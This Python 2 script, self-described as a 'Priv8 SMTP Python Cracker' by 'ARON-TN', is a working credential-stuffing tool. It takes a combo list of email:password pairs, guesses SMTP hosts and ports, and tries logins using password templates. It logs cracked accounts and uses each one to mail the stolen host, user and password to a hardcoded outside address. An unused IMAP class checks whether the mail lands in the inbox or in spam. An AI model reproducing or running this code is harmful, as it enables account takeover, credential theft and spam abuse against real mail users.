#!/usr/bin/env python
# encoding: utf-8
import socket,threading,base64,datetime,sys,ssl,imaplib,time,re
from colorama import *
init()
try:
	import Queue
except:
	try:
	 import queue as Queue
	except:
		pip.main['install','Queue']
to_check={}
print '\033[1m'
class IMAP4_SSL(imaplib.IMAP4_SSL):
    def __init__(self, host='', port=imaplib.IMAP4_SSL_PORT, keyfile=None, 
                 certfile=None, ssl_version=None, ca_certs=None, 
                 ssl_ciphers=None,timeout=40):
       self.ssl_version = ssl_version
       self.ca_certs = ca_certs
       self.ssl_ciphers = ssl_ciphers
       self.timeout=timeout
       imaplib.IMAP4_SSL.__init__(self, host, port, keyfile, certfile)
  
    def open(self, host='', port=imaplib.IMAP4_SSL_PORT):
       self.host = host
       self.port = port
       self.sock = socket.create_connection((host, port),self.timeout)
       extra_args = {}
       if self.ssl_version:
           extra_args['ssl_version'] = self.ssl_version
       if self.ca_certs:
           extra_args['cert_reqs'] = ssl.CERT_REQUIRED
           extra_args['ca_certs'] = self.ca_certs
       if self.ssl_ciphers:
           extra_args['ciphers'] = self.ssl_ciphers
  
       self.sslobj = ssl.wrap_socket(self.sock, self.keyfile, self.certfile, 
                                     **extra_args)
       self.file = self.sslobj.makefile('rb')
class checkerr(threading.Thread):
	def __init__(self,host,user,pwd,timeout,interval):
		t=threading.Thread.__init__(self)
		self.host=host
		self.user=user
		self.pwd=pwd
		self.interval=interval
		self.timeout=timeout
		self.connected=False
		self.i=None
		self.work=True
		self.attemp=4
		self.inbox=''
		self.spam=''
	def connect(self):
		try:
			i=IMAP4_SSL(host=self.host,port=993)
			
			i.login(self.user,self.pwd)
			self.i=i
			self.connected=True
		except Exception,e:
			print str(e)
			i.close()
			self.connected=False
	def find(self):
		global to_check
		if self.inbox=='':
			rez,folders=self.i.list()
			for f in folders:
				if '"|" ' in f:
					a=f.split('"|" ')
				elif '"/" ' in f:
					a=f.split('"/" ')
				folder=a[1].replace('"','')
				if self.inbox=="":
					if 'inbox' in folder.lower():
						self.inbox=folder
				elif self.spam=="":
					if 'spam' in folder.lower():
						self.spam=folder
			if self.spam=='':
				for f in folders:
					if '"|" ' in f:
						a=f.split('"|" ')
					elif '"/" ' in f:
						a=f.split('"/" ')
					folder=a[1].replace('"','')
					if self.spam=="":
						if 'trash' in folder:
							self.spam=folder
					else:
						break
		print '\033[92m [+] Checking for emails\033[00m'
		self.i.select(self.inbox)
		found=[]
		for k,t in enumerate(to_check):
			rez=self.i.search(None,'SUBJECT',t[0])
			times=time.time()-t[1]
			if times-2>self.timeout:
				
				open('checked.txt','a').write(t[0]+"| NOTFOUND | %.2f sec\n"%times)
				found.append(k)
				
			if len(rez)>0:
				open('checked.txt','a').write(t[0]+"| INBOX | %.2f sec\n"%times)
				found.append(k)
		self.i.select(self.spam)
		for k,t in enumerate(to_check):
			rez=self.i.search(None,'SUBJECT',t[0])
			times=time.time()-t[1]
			if times-2>self.timeout:
				
				open('checked.txt','a').write(t[0]+"| NOTFOUND | %.2f sec\n"%times)
				found.append(k)
			if len(rez)>0:
				open('checked.txt','a').write(t[0]+"| SPAM | %.2f sec\n"%times)
				found.append(k)
		new=[]
		for k,v in enumerate(to_check):
			if k not in found:
				new.append(v)
		to_check=new
		print to_check

	def run(self):
		global to_checks
		while self.work:
			if not self.connected:
				if self.attemp<=0:
					return 0
				self.connect()
				self.attemp-=1
			if len(to_check)>0:
				self.find()
			time.sleep(self.interval)

def tld2(dom):
		global tlds
		if "." not in dom:
			return ""
		dom=dom.lower()
		parts=dom.split(".")
		if len(parts)<2 or parts[0]=="" or parts[1]=="":
			return ""
		tmp=parts[-1]

		for i,j in enumerate(parts[::-1][1:5]):
		
			try:
				tmp=tlds[tmp]
				tmp=j+"."+tmp
			except:
				if i==0:
					return ""
				return tmp
		return tmp		
class consumer(threading.Thread):
	def __init__(self,qu):
		threading.Thread.__init__(self)
		self.q=qu
		self.hosts=["","smtp.","mail.","webmail."]
		self.ports=[587,465,25]

		self.timeout=13

	def sendCmd(self,sock,cmd):
		sock.send(cmd+"\r\n")
		return sock.recv(900000)
	def addBad(self,ip):
		global bads,rbads
		if rbads:
			open('bads.txt','a').write(ip+'\n')
			bads.append(ip)
		return -1
	def findHost(self,host):
		global cache,bads,rbads
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.setblocking(0)
		s.settimeout(self.timeout)

		try:
			d=cache[host]
			try:
				if self.ports[d[1]]==465:
					s=ssl.wrap_socket(s)
				s.connect((self.hosts[d[0]]+host,self.ports[d[1]]))
				return s
			except Exception,e:
				if rbads:
					bads.append(host)
					open('bads.txt','a').write(host+'\n')
				return None
		except KeyError:
			pass
		print '\033[92m [*] Searching smtp host and port on \033[00m'+host
		cache[host]=[-1,-1]
		for i,p in enumerate(self.ports):
			for j,h in enumerate(self.hosts):
				
				try:
					print '\033[92m [*] Trying connection on \033[00m'+h+host+':'+str(p)

					s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
					s.setblocking(0)
					s.settimeout(self.timeout)
					if p==465:
						s=ssl.wrap_socket(s)
					s.connect((h+host,p))
					cache[host]=[j,i]

					return s
				except Exception,e:
					
					continue
		bads.append(host)
		del cache[host]
		open('bads.txt','a').write(host+'\n')
		return None

	def getPass(self,passw,user,domain):
		passw=str(passw)
		
		if '%null%' in passw:
			return ""
		elif '%user%' in passw:
			user=user.replace('-','').replace('.','').replace('_','')
			return passw.replace('%user%',user)
		elif '%User%' in user:
			user=user.replace('-','').replace('.','').replace('_','')
			return passw.replace('%User%',user)
		elif '%special%' in user:
			user=user.replace('-','').replace('.','').replace('_','').replace('e','3').replace('i','1').replace('a','@')
			return passw.replace('%special%',user)
		elif '%domain%' in passw:
			return passw.replace('%domain%',domain.replace("-",""))
		if '%part' in passw:
			if '-' in user:
				parts=user.split('-')
			elif '.' in user:
				parts=user.split('.')
			elif '_' in user:
				parts=user.split('_')
			print parts				
			try:
				h=passw.replace('%part','').split('%')[0]
				i=int(h)

				p=passw.replace('%part'+str(i)+'%',parts[i-1])
				return p
			except Exception,e:
				return None
		return passw

	def connect(self,tupple,ssl=False):
		global bads,cracked,cache,email,successful
		
		host=tupple[0].rstrip()
		host1=host
		user=tupple[1].rstrip()
		
		if host1 in cracked or host1 in bads:
			return 0
		passw=self.getPass(tupple[2].rstrip(),user.rstrip().split('@')[0],host.rstrip().split('.')[0])
		if passw==None:
			return 0
		try:
			if cache[host][0]==-1:
				return 0
		except KeyError:
			pass
		s=self.findHost(host)
		if s==None:
			return -1
		port=str(self.ports[cache[host][1]])
		if port=="465":
			port+="(SSL)"
		host=self.hosts[cache[host][0]]+host
		print '\033[94m[+] Trying \033[00m'+host+":"+port+" "+user+" "+passw
		try:
			
			banner=s.recv(1024)
			if banner[0:3]!="220":
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,"EHLO ADMIN")
			rez=self.sendCmd(s,"AUTH LOGIN")
			if rez[0:3]!='334':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,base64.b64encode(user))
			if rez[0:3]!='334':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			
			rez=self.sendCmd(s,base64.b64encode(passw))
			if rez[0:3]!="235" or 'fail' in rez:
				self.sendCmd(s,'QUIT')
				s.close()
				return 0
			print '\033[93m[>] BomB '+host+':'+port+' '+user+' '+passw
			open('cracked.txt','a').write(host+":"+port+","+user+","+passw+"\n")
			cracked.append(host1)
				
			rez=self.sendCmd(s,"RSET")
			if rez[0:3]!='250':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,"MAIL FROM: <"+user+">")
				
			print rez
			if rez[0:3]!='250':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,"RCPT TO: <"+email+">")
			if rez[0:3]!='250':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,'DATA')
			headers='From: <'+user+'> \r\n'
			headers+='To: '+email+'\r\n'
			headers+='Reply-To: '+email+'\r\n'
			headers+='Subject: %s:%s %s %s'%(host,port,user,passw)+'\r\n'
			headers+='MIME-Version: 1.0\r\n'
			headers+='Content-Transfer-encoding: 8bit\r\n'
			headers+='Return-Path: %s\r\n'%user
			headers+='X-Priority: 1\r\n'
			headers+='X-MSmail-Priority: High\r\n'
			headers+='X-Mailer: Microsoft Office Outlook, Build 11.0.5510\r\n'
			headers+='X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441\r\n'
			headers+='HEllo\r\n.\r\n'
			s.send(headers)
			rez=s.recv(1000)
			
			self.sendCmd(s,'QUIT')
			s.close()
		except Exception,e:
			open('hm.txt','a').write(host+":"+port+":"+str(e)+"\n")
			s.close()
			return self.addBad(host1)
	def run(self):
		while True:
			cmb=self.q.get()
			self.connect(cmb)
			self.q.task_done()
quee=Queue.Queue(maxsize=20000)
try:
 tld=open('tlds.txt','r').read().splitlines()
except:
	sys.exit("\033[91m{!} tlds.txt not Founded\033[00m")
tlds=cache={}
bads=[]
cracked=[]
rbads=1
email='aron-tn@protonmail.com'
try:
 inputs=open(sys.argv[1],'r').read().splitlines()
 thret=sys.argv[2]
 if int(thret)>200:
	thret=200
 option=sys.argv[3]
except:
 print('''\033[91m
              \|/      
             (o o)     
         ooO--(_)--Ooo-
\033[94m _  _  ___   _   _  _____  ___  
( \/ )/  _) ( `-' )(_   _)(   ) 
 \  / \_"-. | \_/ |  | |  | O  |
 (  )  __) )( ) ( )  ( )  ( __/ 
/_/\_\/___/ /_\ /_\  /_\  /_\   
                               \033[93mBy ARON-TN 
 ''')
 inputs=open(raw_input('\033[91m[\033[92m+\033[91m]\033[92mCombo Name : \033[93m '),'r').read().splitlines()
 thret=raw_input("\033[91m[\033[92m+\033[91m]\033[92mThreads(Max:200) : \033[93m ")#dont change this
 if int(thret)>200:
	thret=200
 print """ \033[93m[\033[91m!\033[93m] Priv8 SMTP Python Cracker (bug fixed!)\n Recoder Mail : %s
 \033[94m[\033[91m!\033[94m] \033[93mThis Tool is Part For ZABA B0T project :v
 \033[94m[\033[92m/\033[94m] \033[93mFacebook > amir.othman.official"""%(email)

def part():
	global tld,tlds
	for i in tld:
		tlds[i]=i
part()
msg ="              WeLcome Bro Just Waiit \n\nConnecting ..........."
for i in msg:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.2)

for i in range(int(thret)):
	try:
		t=consumer(quee)
		t.setDaemon(True)
		t.start()
	except:
		print "\033[91m{!} Working only with %s threads\033[00m"%i
		break

for i in inputs:
 c=i.split(":")
 quee.put((c[0].split('@')[1],c[0],c[1]))

quee.join()